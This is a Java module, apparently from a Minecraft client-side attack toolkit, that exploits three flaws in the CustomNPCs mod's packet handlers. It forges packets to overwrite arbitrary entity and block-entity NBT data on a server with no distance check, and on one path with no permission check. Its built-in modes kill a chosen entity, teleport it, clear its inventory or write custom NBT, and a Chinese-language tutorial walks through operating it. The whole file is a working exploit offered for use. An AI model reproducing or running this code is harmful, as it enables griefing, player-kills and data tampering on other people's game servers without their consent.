package com.redblue.red.modules.customnpcs;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.FloatTag;
import net.minecraft.nbt.DoubleTag;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * CNPC-01: Arbitrary NBT Overwrite via NbtBook packets.
 *
 * Combines three related vulnerabilities:
 * - Vuln #1 (index 81): SPacketNbtBookEntitySave -- Entity.load(data), no distance check
 *   Wire: writeInt(entityId) + writeNbt(CompoundTag)
 *   Requires: nbt_book tool + TOOL_NBTBOOK permission
 *
 * - Vuln #2 (index 80): SPacketNbtBookBlockSave -- BlockEntity.load(data), no distance check
 *   Wire: writeBlockPos(pos) + writeNbt(CompoundTag)
 *   Requires: nbt_book tool + TOOL_NBTBOOK permission
 *
 * - Vuln #5 (index 133): SPacketTileEntitySave -- BlockEntity.load(data), no distance check
 *   Wire: writeNbt(CompoundTag) -- pos extracted from tag's x/y/z keys
 *   Requires: wand/border/copy/redstone/scripted/waypoint tool, NO permission check
 */
public class CNPC01_NbtOverwrite implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("customnpcs", "packets");
    private static final int IDX_NBT_BLOCK_SAVE = 80;
    private static final int IDX_NBT_ENTITY_SAVE = 81;
    private static final int IDX_TILE_ENTITY_SAVE = 133;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("mode", "攻击模式", "ENTITY_KILL",
                "ENTITY_KILL", "ENTITY_NBT", "BLOCK_NBT", "TILE_NBT"),
        // Entity mode params
        ConfigParam.ofEntity("entity_id", "目标实体")
                .visibleWhen("mode", "ENTITY_KILL", "ENTITY_NBT"),
        ConfigParam.ofEnum("entity_action", "实体操作", "KILL",
                "KILL", "TELEPORT", "CLEAR_INV")
                .visibleWhen("mode", "ENTITY_KILL", "ENTITY_NBT"),
        // Block mode params
        ConfigParam.ofAction("fill_pos", "填充当前坐标", () -> {
            Minecraft mc = Minecraft.getInstance();
            if (mc.player != null) {
                BlockPos pos = mc.player.blockPosition();
                getParamStatic("block_pos").ifPresent(p ->
                    p.set(pos.getX() + "," + pos.getY() + "," + pos.getZ()));
            }
        }).visibleWhen("mode", "BLOCK_NBT", "TILE_NBT"),
        ConfigParam.ofString("block_pos", "目标坐标(x,y,z)", "0,64,0")
                .visibleWhen("mode", "BLOCK_NBT", "TILE_NBT"),
        ConfigParam.ofString("custom_nbt", "自定义NBT(SNBT格式)", "")
    );

    // Static ref for action callback
    private static List<ConfigParam> staticParams;
    { staticParams = params; }

    private static java.util.Optional<ConfigParam> getParamStatic(String key) {
        if (staticParams == null) return java.util.Optional.empty();
        return staticParams.stream().filter(p -> p.key.equals(key)).findFirst();
    }

    @Override public String id() { return "cnpc01_nbt_overwrite"; }
    @Override public String name() { return "NBT覆写"; }
    @Override public String description() { return "覆写任意实体/方块实体的NBT数据(无距离限制)"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 手持 nbt_book(实体/方块模式) 或 wand(TileEntity模式)\n"
            + "2. 选择攻击模式:\n"
            + "   ENTITY_KILL -- 将目标实体生命值设为0(击杀)\n"
            + "   ENTITY_NBT -- 用自定义NBT覆写实体\n"
            + "   BLOCK_NBT -- 用自定义NBT覆写方块实体(需nbt_book)\n"
            + "   TILE_NBT -- 用自定义NBT覆写CustomNPCs方块实体(需wand,无权限检查)\n"
            + "3. 实体模式: 用准星选取目标实体\n"
            + "4. 方块模式: 填写目标坐标\n"
            + "5. 点击执行\n\n"
            + "[注意]\n"
            + "ENTITY_KILL/ENTITY_NBT/BLOCK_NBT 需要 TOOL_NBTBOOK 权限\n"
            + "TILE_NBT 无权限检查,但只能覆写 CustomNPCs 的方块实体";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("customnpcs");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        String mode = getParam("mode").map(ConfigParam::getString).orElse("ENTITY_KILL");

        switch (mode) {
            case "ENTITY_KILL" -> doEntityKill(mc);
            case "ENTITY_NBT" -> doEntityNbt(mc);
            case "BLOCK_NBT" -> doBlockNbt(mc);
            case "TILE_NBT" -> doTileNbt(mc);
        }
    }

    private void doEntityKill(Minecraft mc) {
        int entityId = getParam("entity_id").map(ConfigParam::getInt).orElse(0);
        if (entityId == 0) return;

        CompoundTag tag = new CompoundTag();
        tag.putFloat("Health", 0.0f);
        // Set absorption to 0 to prevent survival
        tag.putFloat("AbsorptionAmount", 0.0f);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_NBT_ENTITY_SAVE);
            buf.writeInt(entityId);
            buf.writeNbt(tag);
        });
    }

    private void doEntityNbt(Minecraft mc) {
        int entityId = getParam("entity_id").map(ConfigParam::getInt).orElse(0);
        if (entityId == 0) return;

        String snbt = getParam("custom_nbt").map(ConfigParam::getString).orElse("");
        CompoundTag tag = parseSnbt(snbt);
        if (tag == null) return;

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_NBT_ENTITY_SAVE);
            buf.writeInt(entityId);
            buf.writeNbt(tag);
        });
    }

    private void doBlockNbt(Minecraft mc) {
        BlockPos pos = parseBlockPos(
            getParam("block_pos").map(ConfigParam::getString).orElse("0,64,0"));

        String snbt = getParam("custom_nbt").map(ConfigParam::getString).orElse("");
        CompoundTag tag = parseSnbt(snbt);
        if (tag == null) tag = new CompoundTag();

        final CompoundTag finalTag = tag;
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_NBT_BLOCK_SAVE);
            buf.writeBlockPos(pos);
            buf.writeNbt(finalTag);
        });
    }

    private void doTileNbt(Minecraft mc) {
        BlockPos pos = parseBlockPos(
            getParam("block_pos").map(ConfigParam::getString).orElse("0,64,0"));

        String snbt = getParam("custom_nbt").map(ConfigParam::getString).orElse("");
        CompoundTag tag = parseSnbt(snbt);
        if (tag == null) tag = new CompoundTag();

        // TileEntitySave extracts x/y/z from the CompoundTag itself
        tag.putInt("x", pos.getX());
        tag.putInt("y", pos.getY());
        tag.putInt("z", pos.getZ());

        final CompoundTag finalTag = tag;
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_TILE_ENTITY_SAVE);
            buf.writeNbt(finalTag);
        });
    }

    private CompoundTag parseSnbt(String snbt) {
        if (snbt == null || snbt.isEmpty()) return null;
        try {
            return net.minecraft.nbt.TagParser.parseTag(snbt);
        } catch (Exception e) {
            return null;
        }
    }

    private BlockPos parseBlockPos(String posStr) {
        try {
            String[] parts = posStr.split(",");
            return new BlockPos(
                Integer.parseInt(parts[0].trim()),
                Integer.parseInt(parts[1].trim()),
                Integer.parseInt(parts[2].trim()));
        } catch (Exception e) {
            return new BlockPos(0, 64, 0);
        }
    }
}
